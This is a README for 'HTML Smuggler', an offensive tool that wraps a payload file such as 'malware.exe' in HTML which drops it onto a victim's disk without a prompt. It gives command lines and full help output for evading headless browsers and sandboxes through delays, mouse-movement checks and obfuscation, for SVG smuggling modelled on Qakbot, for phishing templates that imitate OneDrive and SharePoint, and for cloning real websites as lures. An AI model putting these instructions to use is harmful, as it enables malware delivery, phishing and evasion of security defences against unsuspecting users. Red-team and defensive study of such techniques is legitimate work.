# HTML Smuggler

A simple, lightweight implementation of HTML Smuggling drive-by vector.

Takes a file on input, produces templated HTML that will automatically drop file to the victim's HDD without prompt.

## Features

- Incorporates [anti-headless](https://github.com/infosimples/detect-headless), time-delayed and mouse-move evasions
- Utilises GET/Hash/hardcoded parameter guided post-drop URL redirection
- Uses `jsmin` Javascript minifier to slightly obfuscate effective code
- Offers easy plug-and-play support for custom HTML templates

## Example

Embed your `evil.iso` into HTML, making sure its gonna slip through headless browsers, wait 3 seconds and ensure there is mouse movement activity before dropping file.
Afterwards, redirect to `https://google.com`. Use OneDrive template:

```
cmd> py smuggler.py evil.iso index.html -M -t onedrive
```

## Templates

Smuggler takes HTML code on input, backdoors it with HTML Smuggling payload and spits out backdoored HTML output.

To have a sensible input HTML, it uses both builtin/preset & user supplied HTML templates.

Each template is expected to have at least one placeholder in it - **`__HTML_SMUGGLING_PAYLOAD__`** that will be substituted with generated Javascript code. If that's not present, `smuggler` injects into `<head>` section.

There are also other placeholders available that will get replaced accordingly, namely:

| Placeholder | Description                                                                                                                             |   |
|-------------|-----------------------------------------------------------------------------------------------------------------------------------------|---|
| `__HTML_SMUGGLING_PAYLOAD__`      | Will be replaced with HTML Smuggling Javascript code (or SVG file). If not present, `smuggler` injects that code into `<head>` section. |   |
| `__SMUGGLED_FILENAME__`           | This placeholder gets replaced with output file name or whatever was provided in `-O/--output-filename`                                 |   |
| `__SMUGGLED_FILE_SIZE__`          | Gets replaced with input file size in human-readable format (MBs, KBs).                                                                                                      |   |
| `__SMUGGLED_FILE_SIZE_BYTES__`    | Gets replaced with input file size in bytes.                                                                                                      |   |
| `__SMUGGLED_FILE_MODIFIED_TIMESTAMP__`    | Replaced with input file modified timestamp (UNIX).                                                                                                      |   |
| `__SMUGGLED_FILE_MODIFIED_TIME__`    | Replaced with input printed file time in `%d/%m/%Y, %H:%M` format                                                                                                    |   |


### Preset templates

By default, preset HTML smuggling templates are located in:

```
assets/website-templates/
```

There are bunch of them, such as:

- `blank.html`
- `onedrive.html`
- `sharepoint.html`


### Custom template

One can specify custom HTML template complementing operation-specific social engineering pretext and then point it to smuggler with:

```
py smuggler.py [...] --template MyCustomTemplate.html
```

Whenever specifying your custom template, ensure it contains `__HTML_SMUGGLING_PAYLOAD__` placeholder value that will be substituted by smuggler during HTML weaponisation round.

HTML template can be as simple as the following one:

```
<!DOCTYPE html>
<html>
  <head>
  __HTML_SMUGGLING_PAYLOAD__
  </head>
  <body>
  </body>
</html>
```

### Clone Website

IF you wish to clone/spoof another website and come up with a landing page resembling it, consider mirroring that website with `wget` to pull a single HTML file:

```
wget --no-check-certificate -U "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36" --mirror --convert-links --page-requisites --restrict-file-names=windows --no-parent "https://<URL>"
```

Afterwards, simply pass downloaded file over to `smuggler` so that it does the rest:

```
py smuggler.py malware.exe index.html -t wget-mirrored-website.html
```

Smuggler will take your just mirrored HTML template, adjust it and backdoor it with embedded file. 

Plain and simple :)


## Installation

Install following python requirements before using it:

```
pip3 install -r requirements.txt
```

## Troubleshoot mode

If you opt to use **anti-headless** and/or **mousemovement** detection - and file hasn't drop, try adding `--troubleshoot` switch to see what's going on.

Then, you might consider lowering threshold for anti-headless tests, with `--max-failed-tests` parameter.

If that won't work, try turning off obfuscation with `--no-obfuscate`. I know that's not perfect, but sometimes things break when we _obfuscate all the things_ ^.^


## SVG Smuggling

It is possible to embed generated HTML Smuggling Javascript payload code within embedded SVG file to mimi [Qakbot TTPs](https://blog.talosintelligence.com/html-smugglers-turn-to-svg-images/) for instance.

To do that, we can use `--svg` parameter. To even further obfuscate such Javascript code, we might add `--encode` to base64 encode it within that SVG:

```
python smuggler.py README.md foo.html -s templates\svgs\cartman.svg -e -X 100,100,px
```

The `--svg` parameter expects to be pointed on .SVG file to that should be backdoored and embeded in resulting .HTML.

You can also generate `.svg` file directly by adjusting extension accordingly:

```
python smuggler.py README.md foo.svg -s templates\svgs\cartman.svg
```


## Help

```
usage:
    :: HTML Smuggler - The sleazy underbelly of your friendly HTML
    Simple script that takes file on input and produces templated smuggling output.


Usage: smuggler.py [options] <infile>

options:
  -h, --help            show this help message and exit

Required arguments:
  infile                Input file to be embedded in HTML Smuggling manner or YAML with options
  -o OUTFILE, --outfile OUTFILE
                        Output file containing HTML with embedded payload

Options:
  -v, --verbose         Verbose mode.
  -d, --debug           Debug mode.
  -T, --troubleshoot    Display Alert message with anti-headless results and mousemovement events captured for troubleshooting purposes.
  -N, --nocolor         Dont use colors in text output.
  -f, --force           If specified output file already exists, force overwriting it.
  -p PLACEHOLDER, --placeholder PLACEHOLDER
                        Placeholder to be located in input HTML template file where to store generated Javascript code. DO NOT add surrounding <script></script> tags! py smuggler.py will add them automatically around your placeholder. Default: __HTML_SMUGGLING_PAYLOAD__

Evasion:
  -A, --no-obfuscate    Dont obfuscate resulting HTML. By default HTML gets obfuscated.
  -H, ---no-detect-headless
                        By default, this script adds logic that detects headless clients, or bots to avoid dropping payloads into unsafe environments. This option DISABLES this logic. Default: add headless detection.
  -D DELAY, --delay DELAY
                        Pause for this many milliseconds before dropping payload. Aims to evade emulators. Default: 2000
  -F MAX_FAILED_TESTS, --max-failed-tests MAX_FAILED_TESTS
                        If headless detection is used, this parameter determines number of anti-headless tests that are accepted to fail. The bigger the number, the less certain we're to detect headless clients/bots but the more sure we're to deliver payload to the victim. Accepted values: <0..14>. Default: 2
  -M, --mousemove       Require Mouse Movement before downloading file. Number of events that needs to be generated before file can be downloaded are specified in --mousemove-events (default: 50). Default: don't require mouse movement.
  --mousemove-events MOUSEMOVE_EVENTS
                        Headless detection logic analyzes number of Mouse Move events. If there are more events than this number, test will conclude user is visiting our website. Otherwise it must be bot/sandbox. The higher the number, the more mouse movement required to pass the test. Default: 10 events.

Look & Feel:
  -t TEMPLATE, --template TEMPLATE
                        Path to the HTML template file or a name from templates/website-templates. By default: "sharepoint" template is used.
  -O NAME, --output-filename NAME
                        Name for the output file to be dropped. By default will use the name of the input payload file.
  -m MIME, --mime-type MIME
                        Mime type for the dropped file. By default will automatically detect input payload's mimetype.

Redirect:
  -u URL, --url URL     After dropping file to target's computer, redirect to this URL.
  -U PARAM, --get-url-param PARAM
                        After dropping file to target's computer, redirect to URL stored in website's GET parameter named like speciifed. E.g. when URL is "https://example.com/foo.html?url=https://google.com" use --get-url-param "url" to denote that "url=" GET value should be used to redirect to.
  --hash-url-param PARAM
                        After dropping file to target's computer, redirect to URL stored in website's hash parameter named like speciifed. E.g. when URL is "https://example.com/foo.html#hurl=https://google.com" use --hash-url-param "hurl" to denote that "hurl=" hash value should be used to redirect to.
  -y MILIS, --redirect-delay MILIS
                        After dropping file, wait this amount of miliseconds before redirecting to arbitrary URL.
  -x URL, --xhr-base-url URL
                        If your HTML template does some XMLHttpRequest/Ajax requests to indirect paths ("/foo/bar"), you can set Base URL to prepend them with ("https://example.com/foo/bar"). This will help your template work better, generate less 404.

SVG Smuggling:
  -s SVG, --svg SVG     Path to input SVG file that will be injected with Javascript payload executing actual smuggling logic.
  -e, --encode          Encode backdoored SVG code and then emplace encoded form into HTML template.
  -X DIMENSION, --dimension DIMENSION
                        SVG dimensions to use. Format width,height,unit. Default: 100,100,% . Example: -X 300,150,px or -X 100,30,rem

-----------------------------------------------------

Available HTML templates:

        - blank
        - onedrive
        - sharepoint

-----------------------------------------------------
```

---


```
